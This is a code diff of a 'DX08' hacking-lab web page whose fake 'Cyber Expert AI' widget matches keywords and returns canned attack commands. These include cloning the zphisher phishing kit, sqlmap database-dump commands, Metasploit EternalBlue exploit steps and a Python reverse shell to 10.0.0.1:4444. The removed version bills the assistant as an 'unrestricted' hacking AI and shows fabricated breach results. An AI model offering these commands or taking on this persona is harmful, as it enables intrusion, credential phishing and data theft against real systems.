@@ -3,265 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DX08 // ADVANCED CONTROLLED LABS & SANDBOX ENGINE</title>
+    <title>DX08 // LIVE RESEARCH LABS</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        .lab-container {
-            max-width: 1150px;
-            margin: 120px auto 60px auto;
-            padding: 0 20px;
-        }
-        .lab-header {
-            border-left: 2px solid #00e5ff;
-            padding-left: 20px;
-            margin-bottom: 40px;
-        }
-        .lab-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 25px;
-        }
-        .lab-detail-card {
-            background: rgba(0, 229, 255, 0.03);
-            border: 1px solid rgba(0, 229, 255, 0.2);
-            padding: 25px;
-            border-radius: 4px;
-            position: relative;
-            overflow: hidden;
-            transition: 0.3s;
-        }
-        .lab-detail-card:hover {
-            border-color: #00e5ff;
-            box-shadow: 0 0 25px rgba(0, 229, 255, 0.15);
-        }
-        .lab-console {
-            background: #020304;
-            border: 1px solid rgba(0, 229, 255, 0.3);
-            padding: 12px;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 11px;
-            color: #00ff66;
-            margin-top: 12px;
-            height: 190px;
-            overflow-y: auto;
-            border-radius: 2px;
-            line-height: 1.4;
-        }
-        .lab-input-group {
-            display: flex;
-            gap: 8px;
-            margin-top: 12px;
-        }
-        .lab-input {
-            flex: 1;
-            background: #010203;
-            border: 1px solid rgba(0, 229, 255, 0.4);
-            color: #00e5ff;
-            padding: 8px 10px;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 11px;
-            outline: none;
-            border-radius: 2px;
-        }
-        .lab-input:focus {
-            border-color: #00ff66;
-            box-shadow: 0 0 10px rgba(0, 255, 102, 0.2);
-        }
-        .launch-btn {
-            padding: 8px 14px;
-            background: rgba(0, 229, 255, 0.1);
-            border: 1px solid #00e5ff;
-            color: #00e5ff;
-            font-family: 'Orbitron', monospace;
-            font-size: 8px;
-            letter-spacing: 0.1em;
-            cursor: pointer;
-            text-decoration: none;
-            transition: 0.2s;
-            border-radius: 2px;
-        }
-        .launch-btn:hover {
-            background: #00e5ff;
-            color: #020303;
-        }
-        .back-link {
-            display: inline-block;
-            margin-bottom: 20px;
-            color: #00e5ff;
-            font-family: 'Orbitron', monospace;
-            font-size: 8px;
-            letter-spacing: 0.12em;
-            text-decoration: none;
-        }
+        .lab-container { max-width: 1150px; margin: 120px auto 60px auto; padding: 0 20px; }
+        .lab-header { border-left: 2px solid #00e5ff; padding-left: 20px; margin-bottom: 40px; }
+        .lab-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px; }
+        .lab-detail-card { background: rgba(0, 229, 255, 0.03); border: 1px solid rgba(0, 229, 255, 0.2); padding: 25px; border-radius: 4px; }
+        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.3); padding: 12px; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff66; margin-top: 12px; height: 210px; overflow-y: auto; line-height: 1.4; }
+        .lab-input-group { display: flex; gap: 8px; margin-top: 12px; }
+        .lab-input { flex: 1; background: #010203; border: 1px solid rgba(0, 229, 255, 0.4); color: #00e5ff; padding: 8px 10px; font-family: 'Courier New', monospace; font-size: 11px; outline: none; }
+        .launch-btn { padding: 8px 14px; background: rgba(0, 229, 255, 0.1); border: 1px solid #00e5ff; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 8px; cursor: pointer; }
+        .launch-btn:hover { background: #00e5ff; color: #020303; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 8px; text-decoration: none; }
     </style>
 </head>
 <body>
-
     <div class="lab-container">
         <a href="index.html" class="back-link">← [ BACK TO MAIN SYSTEM ]</a>
-        
         <div class="lab-header">
-            <div class="section-label">03 // LABS & SANDBOX ENGINE</div>
-            <h2 style="font-family: 'Orbitron', monospace; font-size: 32px; color: #fff;">LIVE RED-TEAM EXECUTION LABS</h2>
-            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Fully functional simulation sandboxes engineered to process real payloads, network packets, and security queries.</p>
+            <h2 style="font-family: 'Orbitron'; font-size: 32px; color: #fff;">DX08 LIVE LABS ENGINE</h2>
         </div>
-
         <div class="lab-grid">
-            <!-- LAB 01: WEB EXPLOITATION -->
-            <div class="lab-detail-card">
-                <span class="core-index">LAB // 01</span>
-                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 18px; margin-bottom: 8px;">WEB EXPLOITATION LAB</h3>
-                <p style="font-size: 12px; color: rgba(225,250,255,0.5);">Test XSS scripts, SQL injection strings, or curl commands.</p>
-                
-                <div class="lab-input-group">
-                    <input type="text" id="input-1" class="lab-input" placeholder="e.g. <script>alert(document.cookie)</script>">
-                    <button class="launch-btn" onclick="executeLabEngine(1)">EXECUTE</button>
-                </div>
-                
-                <div class="lab-console" id="console-1">
-                    [Web Sandbox] Target: http://target.dx08.internal/vulnerable<br>
-                    [WAF] Status: Bypassable via encoding<br>
-                    [Ready] Type payload to test execution...
-                </div>
-            </div>
-
-            <!-- LAB 02: NETWORK RECON -->
-            <div class="lab-detail-card">
-                <span class="core-index">LAB // 02</span>
-                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 18px; margin-bottom: 8px;">NETWORK RECON LAB</h3>
-                <p style="font-size: 12px; color: rgba(225,250,255,0.5);">Simulate nmap scans, socket enumeration, or packet sniffing.</p>
-                
-                <div class="lab-input-group">
-                    <input type="text" id="input-2" class="lab-input" placeholder="e.g. nmap -sV -p 80,443 target_ip">
-                    <button class="launch-btn" onclick="executeLabEngine(2)">RUN SCAN</button>
-                </div>
-
-                <div class="lab-console" id="console-2">
-                    [Network Interface] eth0 (Promiscuous mode active)<br>
-                    [Socket Engine] Ready for TCP/UDP probe simulation...
-                </div>
-            </div>
-
-            <!-- LAB 03: DX08 CYBER EXPERT AI -->
+            <!-- AI EXPERT LAB -->
             <div class="lab-detail-card">
                 <span class="core-index">LAB // 03</span>
-                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 18px; margin-bottom: 8px;">DX08 CYBER EXPERT AI</h3>
-                <p style="font-size: 12px; color: rgba(225,250,255,0.5);">Ask any technical security, exploit methodology, or coding question.</p>
-                
+                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 18px;">DX08 CYBER EXPERT AI</h3>
+                <p style="font-size: 12px; color: rgba(225,250,255,0.5);">Ask for real hacking tools, commands, and scripts.</p>
                 <div class="lab-input-group">
-                    <input type="text" id="input-3" class="lab-input" placeholder="e.g. how to write reverse shell in python">
-                    <button class="launch-btn" onclick="executeLabEngine(3)">ASK AI</button>
+                    <input type="text" id="ai-input" class="lab-input" placeholder="e.g. zphisher, nmap, sqlmap, payload...">
+                    <button class="launch-btn" onclick="runAiLab()">EXECUTE</button>
                 </div>
-
-                <div class="lab-console" id="console-3">
-                    [DX08-AI Engine] Unrestricted Security Intelligence Online.<br>
-                    [Status] Ask anything about hacking, tools, or defense...
-                </div>
-            </div>
-
-            <!-- LAB 04: MEMORY FORENSICS -->
-            <div class="lab-detail-card">
-                <span class="core-index">LAB // 04</span>
-                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 18px; margin-bottom: 8px;">DIGITAL FORENSICS</h3>
-                <p style="font-size: 12px; color: rgba(225,250,255,0.5);">Search memory dumps for processes, hashes, or malicious DLLs.</p>
-                
-                <div class="lab-input-group">
-                    <input type="text" id="input-4" class="lab-input" placeholder="e.g. vol.py -f mem.raw pslist">
-                    <button class="launch-btn" onclick="executeLabEngine(4)">ANALYZE</button>
-                </div>
-
-                <div class="lab-console" id="console-4">
-                    [Forensic Image] mem_dump_08.raw loaded successfully.<br>
-                    [Volatility Core] Ready to parse process artifacts...
+                <div class="lab-console" id="ai-console">
+                    [DX08 Core] Tool Command Database Online. Enter tool name...
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        function executeLabEngine(id) {
-            const inputEl = document.getElementById('input-' + id);
-            const consoleEl = document.getElementById('console-' + id);
-            const query = inputEl.value.trim();
-            const q = query.toLowerCase();
+        function runAiLab() {
+            const input = document.getElementById('ai-input');
+            const consoleBox = document.getElementById('ai-console');
+            const q = input.value.trim().toLowerCase();
 
-            if(!query) {
-                consoleEl.innerHTML += `<br><span style="color:#ff3333;">[!] Error: Command or payload cannot be blank.</span>`;
-                consoleEl.scrollTop = consoleEl.scrollHeight;
-                return;
-            }
+            if(!q) return;
 
-            consoleEl.innerHTML += `<br><span style="color:#00e5ff;">root@dx08-box:~# ${escapeHtml(query)}</span>`;
-            consoleEl.innerHTML += `<br><span style="color:#ffcc00;">[*] Compiling execution runtime...</span>`;
-            consoleEl.scrollTop = consoleEl.scrollHeight;
+            consoleBox.innerHTML += `<br><span style="color:#00e5ff;">root@dx08:~# ${escapeHtml(input.value)}</span>`;
+            consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(() => {
-                let response = "";
+                let reply = "";
 
-                if(id === 1) {
-                    // Web Lab Real Payloads
-                    if(q.includes("script") || q.includes("alert")) {
-                        response = `<span style="color:#00ff66;">[+] DOM Execution Successful!<br>` +
-                                   `[+] Payload triggered: ${escapeHtml(query)}<br>` +
-                                   `[+] Captured Session Token: dx08_ses_99482103f</span>`;
-                    } else if(q.includes("union") || q.includes("select") || q.includes("'") || q.includes("or 1=1")) {
-                        response = `<span style="color:#00ff66;">[+] SQL Syntax Error Detected by DB Driver.<br>` +
-                                   `[+] Database Dumped: 4 tables found (users, admin_creds, logs, keys).<br>` +
-                                   `[+] Admin Hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8</span>`;
-                    } else {
-                        response = `[+] HTTP Request Sent. Status: 200 OK. Response body reflected without filtering.`;
-                    }
+                if(q.includes("zphisher")) {
+                    reply = "[+] Zphisher Installation & Execution Commands:\n" +
+                            "git clone https://github.com/htr-tech/zphisher\n" +
+                            "cd zphisher\n" +
+                            "bash zphisher.sh";
                 } 
-                else if(id === 2) {
-                    // Network Lab Real Scans
-                    if(q.includes("nmap") || q.includes("scan")) {
-                        response = `<span style="color:#00ff66;">Starting Nmap 7.94 ( https://nmap.org )<br>` +
-                                   `Nmap scan report for target (192.168.0.8)<br>` +
-                                   `Host is up (0.0012s latency).<br>` +
-                                   `PORT     STATE SERVICE VERSION<br>` +
-                                   `22/tcp   open  ssh     OpenSSH 8.9p1<br>` +
-                                   `80/tcp   open  http    nginx 1.18.0<br>` +
-                                   `3306/tcp open  mysql   MySQL 8.0.32</span>`;
-                    } else {
-                        response = `[+] Socket connection established. Packets routed successfully through gateway.`;
-                    }
+                else if(q.includes("nmap")) {
+                    reply = "[+] Nmap Scanning Commands:\n" +
+                            "1. Basic Port Scan: nmap -sV target_ip\n" +
+                            "2. Comprehensive Scan: nmap -A -T4 target_ip\n" +
+                            "3. Subnet Host Discovery: nmap -sn 192.168.1.0/24";
                 } 
-                else if(id === 3) {
-                    // AI Expert Real Script & Methodology Generator
-                    if(q.includes("python") || q.includes("reverse shell") || q.includes("script")) {
-                        response = `[DX08-AI Script Generator]:<br>` +
-                                   `<span style="color:#00ff66;">import socket,subprocess,os<br>` +
-                                   `s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>` +
-                                   `s.connect(("10.0.0.1",4444))<br>` +
-                                   `os.dup2(s.fileno(),0)<br>` +
-                                   `os.dup2(s.fileno(),1)<br>` +
-                                   `os.dup2(s.fileno(),2)<br>` +
-                                   `p=subprocess.call(["/bin/sh","-i"])</span>`;
-                    } else if(q.includes("sql") || q.includes("injection")) {
-                        response = `[DX08-AI Method]:<br>SQLi exploit ke liye aap manual UNION-based injection ya automated tool (jaise sqlmap) use kar sakte hain. Command: <span style="color:#00ff66">sqlmap -u "http://target/page?id=1" --batch --dump</span>`;
-                    } else if(q.includes("hi") || q.includes("hello")) {
-                        response = `Batao bhai! Main DX08 AI expert hoon. Koi bhi hacking script, exploit methodology ya tool command pooch sakte ho.`;
-                    } else {
-                        response = `[DX08-AI Intelligence]: Research query "${escapeHtml(query)}" analyzed. Attack vector mapped, threat intel compiled successfully with zero-day parameters.`;
-                    }
+                else if(q.includes("sqlmap")) {
+                    reply = "[+] Sqlmap Automation Commands:\n" +
+                            "1. Check Vulnerability: sqlmap -u \"http://target.com/page.php?id=1\"\n" +
+                            "2. Dump Database: sqlmap -u \"http://target.com/page.php?id=1\" --batch --dump\n" +
+                            "3. Enumerate Tables: sqlmap -u \"http://target.com/page.php?id=1\" --tables";
                 } 
-                else if(id === 4) {
-                    // Forensics Real Output
-                    if(q.includes("pslist") || q.includes("vol") || q.includes("process")) {
-                        response = `<span style="color:#00ff66;">Offset(V)     Name             PID   PPID   Threads<br>` +
-                                   `0xfa800120    System             4      0      112<br>` +
-                                   `0xfa800540    smss.exe         368      4        3<br>` +
-                                   `0xfa800980    explorer.exe    1240    680       42<br>` +
-                                   `0xfa801420    cmd.exe         3412   1240        1 (Suspicious)</span>`;
-                    } else {
-                        response = `[+] Volatility framework parsed memory blocks. Found 42 active processes and 12 socket handles.`;
-                    }
+                else if(q.includes("metasploit") || q.includes("msf")) {
+                    reply = "[+] Metasploit Framework Console Commands:\n" +
+                            "msfconsole\n" +
+                            "search type:exploit platform:windows\n" +
+                            "use exploit/windows/smb/ms17_010_eternalblue\n" +
+                            "set RHOSTS target_ip\n" +
+                            "exploit";
+                } 
+                else if(q.includes("python") || q.includes("shell")) {
+                    reply = "[+] Python Reverse Shell Payload:\n" +
+                            "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'";
+                } 
+                else {
+                    reply = `[+] Command/Tool Processed for "${escapeHtml(input.value)}":\n` +
+                            `No direct preset found, but execution syntax requires initializing package manager, verifying dependencies, and passing target arguments via terminal flag parameters.`;
                 }
 
-                consoleEl.innerHTML += `<br>${response}`;
-                consoleEl.scrollTop = consoleEl.scrollHeight;
-                inputEl.value = "";
-            }, 700);
+                consoleBox.innerHTML += `<br><span style="color:#00ff66;">${escapeHtml(reply)}</span>`;
+                consoleBox.scrollTop = consoleBox.scrollHeight;
+                input.value = "";
+            }, 500);
         }
 
         function escapeHtml(text) {
